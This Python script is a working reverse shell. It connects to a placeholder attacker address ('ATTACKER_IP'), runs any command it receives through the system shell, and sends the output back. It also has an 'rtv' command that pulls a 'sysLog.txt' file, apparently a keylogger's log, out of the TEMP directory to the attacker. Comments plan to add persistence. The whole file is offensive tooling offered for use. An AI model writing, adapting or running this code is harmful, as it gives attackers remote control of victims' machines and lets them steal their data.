
import socket
import subprocess
import os
# Attacker's IP address and port number
attacker_ip = "ATTACKER_IP" 

# Replace with the attacker's IP
attacker_port = 1234 

# Replace with the attacker's port
# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's machine
s.connect((attacker_ip, attacker_port))

# Redirect standard input, output, and error to the socket
while True:
    
    
    command = s.recv(1024).decode("utf-8")# Receive termination command
    if command.lower() == "exit":
        break
        
    
    if command.startswith("cd "):# Change directory command handling
        try:
            os.chdir(command[3:])
            s.send(b"Changed directory successfully\n")
        except Exception as e:
            s.send(f"Failed to change directory:{str(e)}\n".encode("utf-8"))
            continue
            # Execute the command and send the output back


    
    if command.startswith("; "):# Handle executing commands
        try:
            os.system(command[3:])
            #? Next iteration; Would like to capture screen output; then return
            s.send(b"Command executed\n")
        except Exception as e:
            s.send(f"Failed to execute command: {command[3:]}\n")
            continue


    if command.startswith("rtv"):    # Retreive Logged content
        try:
            tmpDir = os.getenv("TEMP")# Capture temp path
            if not tmpDir:
                raise Exception("Could not locate tmp dir\n")
            os.chdir(tmpDir)# Navigate to path

            
            trgFile = "sysLog.txt" # Get File & Validate
            if not os.path.exists(trgFile):
                s.send(b"sysLog not found")
                raise Exception(f"File '{trgFile}' not found\n")# Error out


            with open(trgFile, "r") as file: # Read file content
                try:
                    content = file.read() 
                except Exception as e:
                    print(f"Failed reading: '{trgFile}'\n")
            s.send(content.encode("utf-8")) # Send file content
            


        except Exception as e:
            s.send(f"Failed to retreive logs\n")
            continue


    try:   
        output = subprocess.check_output(command, shell=True,
        stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        s.send(output)

    except Exception as e:
        s.send(str(e).encode("utf-8"))


# Close the connection
s.close()


#? Would be cool to set up a protocal to on exit turn on at
#? X times